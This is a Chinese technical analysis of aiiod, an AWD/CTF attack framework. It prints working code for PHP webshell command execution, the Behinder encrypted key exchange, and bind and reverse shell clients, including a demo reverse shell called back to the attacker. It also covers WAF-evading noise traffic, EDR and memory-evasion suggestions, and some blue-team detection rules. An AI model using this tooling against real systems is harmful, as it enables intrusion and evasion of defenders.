---
title: aiiod AWD 攻防框架核心模块设计与实现详解
description: 深度解析 aiiod AWD 框架的核心组件：Submiter 多线程旗标提交机制、WebShell/SSH/BindShell 统一连接器体系、基于
  epoll 与线程的交互式 Shell 基类实现、流量混淆装饰器设计，覆盖从线程控制、密钥交换、I/O 多路复用到对抗流量特征识别的完整工程实践。
category: program-analysis
tags:
- AWD
- CTF
- 攻防框架
- WebShell
- 冰蝎
- BindShell
- SSH
- 流量混淆
- 多线程
- epoll
- Python
- 红队工具开发
date: '2024-01-15'
updated: '2026-11-15'
---
# aiiod AWD 攻防框架核心模块设计与实现详解

> 原文来源：微信公众号文章《aiiod - 一个AWD框架》，作者 BXS-Team，项目地址：https://github.com/BXS-Team/aiiod

## 概述

**aiiod** 是一款面向 AWD（Attack With Defense，攻防兼备）赛制的自动化攻防框架，旨在解决比赛中 **旗标自动提交、多目标并发攻击、WebShell/SSH/BindShell 统一管理、流量特征对抗** 等核心痛点。框架采用模块化设计，核心组件包括：

- **Submiter**：解耦提交逻辑的多线程旗标消费者，利用 `_thread` 实现非侵入式线程退出控制
- **Connector 体系**：统一封装 WebShell（一句话/冰蝎）、SSH、BindShell 连接器，提供命令执行、文件上传、交互式终端能力
- **Shell 基类**：跨平台交互式 I/O 抽象，Linux 下基于 `selectors/epoll` 单线程多路复用，Windows 下退回双线程模型
- **Obfuscation 装饰器**：在攻击函数前后注入随机噪声流量，对抗流量指纹识别与 WAF 拦截

框架通过 **Task + Crontab** 驱动模型实现定时批量攻击，配合回调服务器接收反连 Flag，形成完整的「攻击-获取-提交」闭环。以下逐模块深度剖析设计理念与关键实现细节。

---

## 整体架构与驱动模型

### 核心类关系图

```text
aiiod
├── Submiter          # 旗标提交器（单例、多线程、重试策略）
├── Connector         # 连接器基类
│   ├── WebShellConnector   # 一句话/冰蝎 WebShell
│   ├── DBConnector         # 数据库连接（预留）
│   └── Shell               # 交互式 Shell 基类
│       ├── SSHConnector    # SSH 连接器
│       └── BindShellConnector  # 反弹/绑定 Shell 连接器
├── Target            # 目标 IP 集合管理（支持排除语法）
├── Task              # 攻击任务封装（函数 + 参数）
├── Crontab           # 定时调度器（驱动 Task 执行）
└── Utils             # 装饰器、回调服务器、持久化载荷等
```

### 典型使用流程（Demo 还原）

```python
import aiiod
import requests

IP = '172.20.11.11'
SUBMIT_URL = 'https://127.0.0.1/Common/awd_sub_answer'
TOKEN = '4300f7f61934925694f6138f3045e61e'
FLAG_PATH = '/flag'

def submit_flag_fn(**kw) -> bool:
    d = {'flag': kw['flag'], 'token': TOKEN}
    r = requests.post(SUBMIT_URL, data=d, verify=False)
    if 'success' in r.text:
        aiiod.logger.success(kw['flag'])
        return True
    else:
        aiiod.logger.error(kw['flag'])
        return False

@aiiod.ignore_errors
@aiiod.ob
def web1(ip):
    w = aiiod.WebShellConnector(f'http://{ip}/login/.aiiod.php', 'cmd')
    flag = w.exec('cat /flag.txt*')
    if 0 < len(flag) < 50:
        submiter.add_flag({'flag': flag, 'ip': ip})
    w.exec(aiiod.persistence.platypus_reverse_shell(IP, 9999))

submiter = aiiod.Submiter(submit_flag_fn)
tasks = []
attack_funcs = [web1]
target = aiiod.Target([f'127.0.0.{i}' for i in range(1, 3)]) - '127.0.0.2'

for func in attack_funcs:
    for ip in target.ips:
        tasks.append(aiiod.Task(func, args=(ip,)))

aiiod.start_callback_server(submiter.add_flag)
crontab = aiiod.Crontab(tasks, 60)
submiter.start()
crontab.start()
submiter.exit()
```

**关键设计点**：

1. **提交函数解耦**：`Submiter` 仅消费队列，具体 HTTP/表单/CSRF 处理由用户自定义 `submit_flag_fn` 实现，适配不同 AWD 平台。
2. **Target 集合运算**：支持 `list - 'ip'` 排除语法，便于剔除己方靶机或蜜罐。
3. **装饰器组合**：`@ignore_errors` 保证单目标异常不影响全局；`@ob` 注入噪声流量对抗流量分析。
4. **回调服务器**：`start_callback_server` 启动 HTTP 监听，接收反连 Shell 回传的 Flag，自动入队 `Submiter`。

---

## Submiter：多线程旗标提交与非侵入式退出控制

### 设计目标

- **高吞吐**：多线程并发调用提交函数，吸收突发 Flag 洪峰
- **可靠重试**：指数退避 + 最大重试次数，应对平台间歇性故障
- **优雅退出**：主线程可随时停止后台线程，**不侵入**提交函数逻辑（无需在函数内检查标志位）

### 核心实现解析

```python
@singleton
class Submiter(object):
    RETRY = 3
    RETRY_DURATION = 3

    def __init__(self, submit_flag_fn, delay=0):
        self._flag_lst = queue.Queue()
        self._exit = False
        self._thread = None
        self._submit_flag_fn = submit_flag_fn
        self._delay = delay

    def add_flag(self, flag: dict):
        """flag 标准化：dict 且值去首尾空白"""
        if not isinstance(flag, dict):
            flag = {'flag': flag}
        for k in flag.keys():
            flag[k] = flag[k].strip()
        self._flag_lst.put(flag)

    def submit_flags(self):
        """主消费循环：阻塞取队列 -> 调用提交函数 -> 睡眠延迟"""
        while not self._exit:
            try:
                flag = self._flag_lst.get()
                self._submit_flag_fn(**flag)
                time.sleep(self._delay)
            except Exception as e:
                logger.error(e.__str__())

    def submit_flag_with_retry(self):
        """带重试的消费循环：get_nowait + 退避轮询 + 重试提交"""
        while True:
            retry = self.RETRY + 2
            flag = ''
            try:
                flag = self._flag_lst.get_nowait()
            except queue.Empty:
                pass
            while retry and not flag:
                time.sleep(self.RETRY_DURATION)
                try:
                    flag = self._flag_lst.get_nowait()
                except queue.Empty:
                    pass
                retry -= 1
            if flag:
                success = self._submit_flag_fn(**flag)
                _retry = self.RETRY - 1
                while not success and _retry:
                    time.sleep(self.RETRY_DURATION)
                    _retry -= 1
                    success = self._submit_flag_fn(**flag)
            if not retry:
                break

    def _start(self):
        """_thread 启动真正工作线程，随函数返回静默退出"""
        _thread.start_new_thread(self.submit_flags, ())
        while not self._exit:
            time.sleep(1)

    def start(self):
        """外部控制：先置 _exit 等待旧线程结束，再启动新线程"""
        if self._thread is not None and self._thread.is_alive():
            self._exit = True
            time.sleep(2)
            self._exit = False
        self._thread = threading.Thread(target=self._start)
        self._thread.start()

    def exit(self):
        self._exit = True
```

### `_thread` vs `threading` 选型深度剖析

| 维度 | `threading.Thread` | `_thread.start_new_thread` |
|------|-------------------|----------------------------|
| **退出控制** | 无原生强制终止，需目标函数轮询标志位 | 线程随启动函数返回 **自动销毁**，无需函数配合 |
| **资源清理** | 需在目标函数 `finally` 中释放 | 仅适用于 **无需显式清理** 资源的场景（如纯 CPU/网络 I/O 循环） |
| **异常传播** | 捕获需额外包装 | 异常直接打印到 stderr，不影响主线程 |
| **适用场景** | 长生命周期、需优雅关闭资源的工作线程 | 简单消费者循环、由外部标志位控制生命周期的后台任务 |

**aiiod 的选择逻辑**：`submit_flags` 仅包含 `Queue.get()` 与网络调用，无文件句柄、锁、数据库连接等需显式释放的资源，因此使用 `_thread` 实现 **“外部置位 `_exit` → 循环自然退出 → 线程函数返回 → 线程消亡”** 的零侵入式退出模式。这一技巧在红队工具开发中常用于 **心跳线程、定时采集器、Beacon 睡眠线程** 等无状态后台任务。[[inceptor-av-edr-evasion-framework#shellcode-加载与执行流程]] [[cobalt-strike-4.7-bof-internals#beacon-睡眠与心跳机制]]

### 重试策略工程化细节

- **双层重试**：`submit_flag_with_retry` 先在队列空时退避等待新 Flag（`RETRY+2` 次），再对单次提交失败进行 `RETRY-1` 次重试
- **幂等性假设**：提交函数需保证幂等（同一 Flag 重复提交不扣分），框架不做去重，**由平台侧保证**
- **延迟控制**：`delay` 参数限流提交频率，防止触发平台反刷接口限流

---

## Connector 体系：统一化的远程代码执行抽象

### 类层级与职责划分

```text
Connector (基类，预留通用接口)
├── WebShellConnector      # HTTP 协议层：一句话/冰蝎
├── DBConnector            # 数据库协议层（预留）
└── Shell                  # 交互式终端基类（TCP/SSH 共用）
    ├── SSHConnector       # paramiko 封装
    └── BindShellConnector # 原生 Socket 封装
```

### WebShellConnector：一句话与冰蝎双模式支持

#### 一句话木马通用执行模板

```python
identify = _random_str()  # 6 位随机字符，作为输出界定符
data = {
    self._pwd: (
        '@ini_set("display_errors","0");'
        '@set_time_limit(0);'
        f'print_r("=={identify}>");'
        f'system(base64_decode($_REQUEST[_]));'
        f'print_r("<{identify}==");'
    ),
    '_': b64encode(cmd.encode()).decode(),
}
```

**设计要点**：

1. **Base64 编码命令**：规避特殊字符在 URL/Body 中被 WAF 截断或转义
2. **随机界定符**：`=={identify}>` / `<{identify}==` 精确提取命令回显，避免页面噪声干扰
3. **错误抑制**：`@ini_set` 关闭错误显示，`@set_time_limit(0)` 移除执行时间限制

#### 冰蝎 (Behinder) 密钥交换与双模式加密

冰蝎 PHP 版工作流程：

1. **首次 GET** `?pwd=1` → 服务端返回 16 字节 **Session Key** (AES-128-CBC 密钥)
2. **探测加密方式**：发送 AES 加密的 `print_r("{identify}")`，若回显含界定符 → 确认为 **AES 模式**；否则回退 **XOR 模式**
3. **后续通信**：统一使用确定的加密方式封装 `system('cmd')` 载荷

```python
def _behinder_key_exchange(self):
    self._session = requests.Session()
    r = self._session.get(self._url, params={self._pwd: '1'}, timeout=self.TIMEOUT)
    self._behinder_key = r.text[:16]
    self._aes_encryptor = AES128Encryptor(self._behinder_key)

    identify = _random_str()
    r = self._session.post(self._url, timeout=self.TIMEOUT,
                           data=self._behinder_aes_encrypt(f'|print_r("{identify}");'))
    if identify in r.text:
        self._enc_way = 'aes'
    else:
        self._enc_way = 'xor'
```

**AES-128-CBC 实现细节**：

- **固定 IV**：`b'\x00' * 16`（冰蝎服务端同源实现）
- **PKCS#7 填充**：长度为 16 倍数时追加一整块 `0x10`
- **密钥补零**：不足 16 字节右侧补 `\x00`

**XOR 回退算法**：

```python
def _behinder_xor_encrypt(self, msg) -> str:
    output = []
    for i in range(len(msg)):
        output.append(chr(ord(msg[i]) ^ ord(self._behinder_key[(i + 1) & 15])))
    return b64encode(''.join(output).encode()).decode()
```

> **实战启示**：冰蝎的“双模式自动协商”设计极大提高了落地存活率——AES 流量熵高但特征明显，XOR 流量熵低但易绕过基于熵的 WAF。aiiod 复现该逻辑，实现了 **零配置自适配**。[[php-webshell-obfuscation-av-evasion#二阶段混淆流水线]] [[inceptor-av-edr-evasion-framework#流量编码与混淆]]

#### 多语言一句话支持矩阵

| 语言 | 执行函数 | 关键技巧 |
|------|----------|----------|
| PHP | `system(base64_decode($_REQUEST[_]))` | Base64 + 界定符提取 |
| ASPX | `System.Diagnostics.ProcessStartInfo` + `RedirectStandardOutput/Error` | 进程启动捕获 stdout/stderr |
| JSP | 直接写入 `Runtime.getRuntime().exec(cmd)` 结果 | 依赖容器回显，无界定符需求 |

**文件上传**：复用 `requests.files` 多部分表单，`move_uploaded_file($_FILES["f"]["tmp_name"], "{dst}")` 落地。

---

### Shell 基类：跨平台交互式 I/O 抽象

`Shell` 封装 **“读取 Channel → 写入 stdout”** 与 **“读取 stdin → 写入 Channel”** 两个方向的数据泵，为 `SSHConnector` 与 `BindShellConnector` 提供统一的 `interactive()` 入口。

#### Linux：`selectors + epoll` 单线程多路复用

```python
def _posix_interactive(self):
    try:
        self._channel.settimeout(0.0)  # 非阻塞
        self._selector.register(self._channel, selectors.EVENT_READ, lambda: self._posix_on_read())
        self._selector.register(sys.stdin, selectors.EVENT_READ, lambda: self._posix_on_write())

        while True:
            if self._done:
                break
            events = self._selector.select()
            for key, _ in events:
                callback = key.data
                callback()
    finally:
        self._selector.unregister(self._channel)
        self._selector.unregister(sys.stdin)
        self._set_timeout(self.TIMEOUT)
```

**优势**：

- **零线程开销**：单线程驱动双向流，内存占用极低
- **公平调度**：`selectors` 底层 `epoll` 保证读写就绪即时响应
- **可移植**：同一代码在 macOS/BSD 自动回退 `kqueue`，Linux 使用 `epoll`

#### Windows：双线程模型（受限于 IOCP 不支持 stdin/stdout）

```python
def _windows_interactive(self):
    _thread.start_new_thread(self._windows_on_read, ())
    self._windows_on_write()  # 主线程跑写循环

def _windows_on_read(self):
    while True:
        if self._done: break
        try:
            buf = self._channel.recv(self.BUFSIZE)
            if not buf:
                sys.stdout.flush()
                self._done = True
                break
            sys.stdout.write(buf.decode(errors='ignore'))
            sys.stdout.flush()
        except (EOFError, OSError):
            pass

def _windows_on_write(self):
    while True:
        if self._done: break
        try:
            line = sys.stdin.readline()
            if not line:
                self._done = True
                break
            if not isinstance(line, bytes):
                line = line.encode()
            self._channel.send(line)
        except (EOFError, OSError):
            self._done = True
            break
```

**根因**：Python `selectors` 在 Windows 仅支持 **Socket** 句柄，`sys.stdin`/`sys.stdout` 为控制台句柄，无法纳入 IOCP 监听。故退回 **“读线程 + 写主线程”** 模型，依然使用 `_thread` 避免 `threading` 退出控制复杂性。

> **对比参考**：Cobalt Strike `beacon> shell`、Metasploit `meterpreter > shell`、Sliver `interactive` 均面临同一跨平台终端交互难题，主流实现均采用 **平台分支** 策略。[[cobalt-strike-external-c2-smb-beacon#smb-beacon-交互式会话]] [[frp内网渗透应用#socks5-代理与交互式会话]]

---

### SSHConnector：paramiko 封装

```python
class SSHConnector(Shell):
    def __init__(self, ip, port, username, password):
        self._client = paramiko.SSHClient()
        self._client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self._client.connect(ip, port, username, password, timeout=self.TIMEOUT)
        self._channel = self._client.invoke_shell()
        super().__init__(self._channel)
```

- 直接复用 `Shell` 基类的 `interactive()`，无额外实现成本
- 适用于 **凭证已知、需交互式修改密码、执行 sudo、运行交互式向导** 场景

---

### BindShellConnector：原生 Socket + Token 同步机制

针对 **反弹 Shell / 绑定 Shell** 纯 TCP 流场景，最大难点在于 **“命令发送后，如何精确读取本次命令的完整输出”**。TCP 为字节流无消息边界，直接 `recv` 会粘包/拆包。

#### Token 分包 + `recv_until` 精确接收

```python
def exec(self, cmd) -> str:
    if not isinstance(cmd, bytes):
        cmd = cmd.encode()
    token = _random_str()
    self._conn.sendall(cmd + b'; echo ' + token.encode() + b'\n')
    output = self._recv_until(token)
    return output.decode(errors='ignore')

def _recv_until(self, token) -> bytes:
    if not isinstance(token, bytes):
        token = token.encode()
    buffer = []
    while True:
        try:
            buffer.append(self._conn.recv(1))
            if len(buffer) >= len(token) and b''.join(buffer[-len(token):]) == token:
                break
        except Exception:
            break
    return b''.join(buffer[:-len(token)])
```

**原理**：

1. 命令追加 `; echo RANDOM_TOKEN\n`（Windows 用 `& echo RANDOM_TOKEN`）
2. 单字节 `recv(1)` 累积缓冲，**滑动窗口匹配** Token
3. 命中 Token 即刻停止，截去 Token 返回纯净输出

**工程权衡**：

- **单字节读取** 开销大，但 AWD 场景命令频次低、输出短，可接受
- **高性能替代**：生产级工具（如 `pwnlib.tubes.sock`、Cobalt Strike Beacon）使用 **定长包头 + 长度前缀** 或 **自定义协议帧** 实现零拷贝分帧。[[iox-proxy-protocol-evasion#协议帧设计与多路复用]] [[c2-redirectors-malleable-c2-profiles#流量分帧与混淆]]

---

## Obfuscation 装饰器：流量混淆与对抗指纹识别

### 设计动机

AWD 比赛中，**蓝队常部署 WAF/IDS 对攻击流量做特征匹配**（如 SQLi、RCE、WebShell 通信特征）。单一攻击流量极易被指纹库命中。`@ob` 装饰器在攻击函数**前后**随机发送**噪声请求**，稀释攻击特征，增加蓝队分析成本。

### 实现代码

```python
def ob(fn):
    @wraps(fn)
    def wrapper(*args, **kw):
        n = random.randint(0, 5)
        for _ in range(n):
            exp = random.choice(obscure_traffics)
            if exp[0] == 'GET':
                requests.get(f'http://{args[0]}{exp[1]}')
            else:
                requests.post(f'http://{args[0]}{exp[1]}', data=exp[2])
        fn(*args, **kw)
        n = random.randint(0, 5)
        for _ in range(n):
            exp = random.choice(obscure_traffics)
            if exp[0] == 'GET':
                requests.get(f'http://{args[0]}{exp[1]}')
            else:
                requests.post(f'http://{args[0]}{exp[1]}', data=exp[2])
    return wrapper
```

### `obscure_traffics` 样本库构建建议

```python
obscure_traffics = [
    ('GET', '/index.php?exp=1'),
    ('POST', '/', 'exp=1'),
    ('GET', '/wp-admin/admin-ajax.php?action=heartbeat'),
    ('POST', '/api/v1/login', 'username=admin&password=admin'),
    ('GET', '/robots.txt'),
    ('GET', '/.git/HEAD'),
    ('POST', '/phpmyadmin/index.php', 'pma_username=root&pma_password=root'),
]
```

**选取策略**：

- **高频合法路径**：`/`, `/robots.txt`, `/favicon.ico`, `/wp-login.php` 等
- **常见漏洞探测路径**：模拟扫描器行为，混淆真实攻击意图
- **随机参数**：携带无害参数增加熵

### 对抗效果评估

| 对手技术 | 对抗效果 | 说明 |
|----------|----------|------|
| **基于规则的 WAF** | ★★★☆☆ | 噪声请求可能触发规则，但攻击请求被淹没，降低单条命中概率 |
| **流量基线/行为分析** | ★★☆☆☆ | 突发噪声可能被标记为异常，需控制频率与时长 |
| **WebShell 通信特征提取** | ★★★★☆ | 随机间隔、随机路径打破固定 URL/参数特征，显著提升存活率 |
| **蜜罐/诱捕系统** | ★★★☆☆ | 噪声请求可能触发蜜罐告警，暴露攻击者 IP 段 |

> **进阶思路**：结合 **域名前置、CDN 跳板、TLS 指纹伪造、HTTP/2 多路复用** 等基础设施层手段，形成纵深混淆体系。[[c2-redirectors-malleable-c2-profiles#域名前置与-cdn-隐匿]] [[iox-proxy-protocol-evasion#协议栈重构与随机-padding]] [[argument-spoofing-edr-evasion#命令行混淆与进程创建对抗]]

---

## 关键工程模式总结

| 模式 | 应用模块 | 核心价值 |
|------|----------|----------|
| **策略模式** | `WebShellConnector._exec_{php,aspx,jsp}` | 统一 `exec()` 入口，动态分发语言特定实现 |
| **模板方法模式** | `Shell._posix_interactive` / `_windows_interactive` | 跨平台差异封装，子类零感知复用 `interactive()` |
| **装饰器模式** | `@ob`, `@ignore_errors` | 横切关注点（混淆、容错）与业务逻辑解耦 |
| **生产者-消费者** | `Crontab` → `Queue` → `Submiter` | 解耦攻击节奏与提交节奏，吸收突发流量 |
| **单例模式** | `Submiter` | 进程级全局唯一提交通道，避免重复初始化 |
| **适配器模式** | `submit_flag_fn` | 适配异构 AWD 平台提交接口 |
| **随机化防御** | `obscure_traffics`, `identify`, `token` | 增加攻击者指纹识别成本，对抗自动化溯源 |

---

## 实战部署与扩展建议

### 生产化改造清单

- [ ] **配置外置化**：YAML/TOML 管理目标、凭证、提交接口、噪声字典
- [ ] **日志结构化**：JSON Lines 输出，接入 ELK/Loki 做实时态势感知
- [ ] **指标暴露**：Prometheus `Counter(gauge)` 统计攻击成功/失败、提交延迟、队列积压
- [ ] **容器化部署**：Docker Compose 编排 `aiiod` + `callback_server` + `redis`(分布式队列) + `prometheus` + `grafana`
- [ ] **插件化攻击模块**：`entry_points` 动态发现 `attack_*.py`，支持热加载

### 红队化演进方向

| 方向 | 参考实现 | 落地建议 |
|------|----------|----------|
| **C2 集成** | Cobalt Strike External C2 / Covenant P2P / Sliver | 将 `BindShellConnector` 替换为 Beacon SMB/Named Pipe 侧向通道，复用 `Shell` 交互基类 |
| **免杀载荷生成** | Donut / pe2shc / sRDI / Inceptor | `persistence.platypus_reverse_shell` 替换为 **无文件反射加载** Shellcode，配合 `@ob` 流量混淆 |
| **内存规避** | FOLIAGE / Ekko / AceLdr | 长驻回调服务器、Submiter 线程内存加密、睡眠时取消映射代码段 |
| **凭证管理** | HashiCorp Vault / AWS Secrets Manager | 消除代码中的硬编码 Token、SSH 密钥、数据库密码 |
| **分布式调度** | Celery / Dramatiq / RQ | 多机协同攻击，Target 分片，Flag 去重、聚合提交 |

### 蓝队视角的检测与缓解

| 检测点 | 规则示例 | 缓解建议 |
|--------|----------|----------|
| **WebShell 通信特征** | Suricata: `alert http any -> $HOME_NET any (msg:"WebShell Base64 cmd"; content:"system(base64_decode"; sid:1000001;)` | 部署 RASP/IAST 监控 `system/exec/passthru` 危险函数调用栈 |
| **冰蝎密钥交换** | Zeek: 监测首包 `GET /?pwd=1` 返回 16 字节高熵字符串 | WAF 拦截首包探测，强制要求 Referer/UA 合法 |
| **BindShell Token 回显** | 正则匹配 `; echo [A-Za-z0-9]{6}\n` | 审计 Shell 历史、进程命令行、网络流载荷 |
| **噪声流量爆发** | 流量基线：单 IP 单位时间请求数/熵值突变 | 限流、人机验证、动态封禁 |
| **Flag 提交异常** | 提交接口高频调用、重复 Flag、异常 User-Agent | 提交接口加签名、限频、审计日志 |

---

## 交叉引用与延伸阅读

### AWD 攻防体系
- [[xd-security-awd-competition-strategies]] — AWD 赛制规则、加固利用并行策略、批量提交脚本、不死马与蜜罐技术
- [[xd-security-blue-team-defense]] — 蓝队防御体系：ATT&CK 映射、HFish 蜜罐、NIDS/HIDS 部署、检测规则编写

### WebShell 与后门技术
- [[php-webshell-fundamentals-chopper-analysis]] — PHP 一句话木马核心原理、蚁剑/菜刀客户端流量解析、Content-Type 绕过上传
- [[php-webshell-obfuscation-av-evasion]] — C++ 两阶段混淆：算术表达式拆分 + XOR 特征函数拆分，生成多态 WebShell
- [[php伪协议与反序列化利用]] — `php://filter`/`php://input`/`data://` 等伪协议在文件包含/反序列化/SSRF 中的利用链

### 交互式 Shell 与隧道技术
- [[internal-network-pivoting-techniques]] — Venom/Frp/SSH/Cobalt Strike SMB Beacon/iox 等代理隧道工具原理与实战配置
- [[frp内网渗透应用]] — Frp SOCKS5 隧道、多级串联、Metasploit 反弹代理、RDP 端口转发
- [[cobalt-strike-external-c2-smb-beacon]] — SMB Beacon 命名管道通信、External C2 规范、心跳包特征、分布式 Team Server
- [[iox-proxy-protocol-evasion]] — iox 协议握手、加密、随机 Padding、多路复用元数据泄露修复、协议栈重构

### 流量混淆与对抗
- [[c2-redirectors-malleable-c2-profiles]] — Malleable C2 Profile 配置、域名前置、CDN 隐匿、重定向器拓扑
- [[argument-spoofing-edr-evasion]] — 命令行欺骗对抗 EDR 进程创建监控、PEB `RTL_USER_PROCESS_PARAMETERS` 利用
- [[inceptor-av-edr-evasion-framework]] — Shikata-Ga-Nai 编码、AMSI/WLDP/ETW/沙箱绕过、Full Unhooking、Direct Syscalls、OLLVM 混淆
- [[memory-scanning-tools-evasion-techniques]] — Hunt-Sleeping-Beacons/BeaconHunter/pe-sieve 等内存扫描工具原理与 UDRL 规避实测

### 红队工程化开发
- [[rust-proc-macro-win32-dynamic-import]] — Rust 宏实现 Win32 API 动态导入、UTF-16 栈上构造、符号哈希化
- [[pe-manual-mapping-loader-implementation]] — 从零手写 PE 手动映射加载器：导入表修复、重定位、导出表解析、模块隐藏、MEM_IMAGE 伪装
- [[ppl-injection-createprocess-bof-fix]] — PPL 注入 `bInheritHandles=FALSE` 绕过、BOF 文件落地替代匿名管道、WinTcb-Light 反内存扫描

### 实战靶场与 Writeup
- [[ctf-smb-wordpress-meterpreter-writeup]] — SMB 空会话枚举、WordPress Getshell、Meterpreter 反弹、本地提权
- [[vulnhub-boredhackerblog-social-network-writeup]] — 代码注入、Docker 逃逸、内网穿透、Elasticsearch CVE-2015-1427、CVE-2013-2094 提权
- [[gkctf-2021-web-writeup]] — Java XMLDecoder RCE、Node.js 原型链污染、Session Upload Progress Getshell、WebLogic CVE-2020-14882、frp 内网穿透

---

## 附录：aiiod 核心数据结构速查

| 结构 | 关键字段 | 说明 |
|------|----------|------|
| `Submiter` | `_flag_lst: Queue`, `_exit: bool`, `_thread: Thread`, `_submit_flag_fn: Callable`, `_delay: float` | 单例、线程安全队列、外部退出控制 |
| `Target` | `ips: List[str]` | 支持 `list - 'ip'` 排除运算，`__iter__` 直接遍历 IP |
| `Task` | `func: Callable`, `args: Tuple`, `kwargs: Dict` | `run()` 执行并捕获异常，返回 `(success, result)` |
| `Crontab` | `tasks: List[Task]`, `interval: int`, `_timer: Timer` | `start()` 循环调度，`stop()` 取消定时器 |
| `WebShellConnector` | `_url`, `_pwd`, `_lang`, `_method`, `_is_behinder`, `_session`, `_enc_way` | 多语言、双模式、文件上传 |
| `Shell` | `_channel`, `_selector`, `_done`, `BUFSIZE`, `TIMEOUT` | 抽象 `interactive()`，平台分支实现 |
| `BindShellConnector` | `_conn: socket`, `_ip`, `_port` | `exec()` Token 分包，`_recv_until()` 精确接收 |

---

## 版本历史

| 版本 | 日期 | 变更摘要 |
|------|------|----------|
| 1.0 | 2024-01-15 | 初始版本：核心四模块深度解析、工程模式总结、实战部署清单、蓝队检测视角、交叉引用索引 |

---

**标签**：`AWD` `CTF` `攻防框架` `WebShell` `冰蝎` `BindShell` `SSH` `流量混淆` `多线程` `epoll` `Python` `红队工具开发` `程序分析`

## 来源

- [0x4d5a-202103-202209_15](../sources/0x4d5a-202103-202209_15.md)
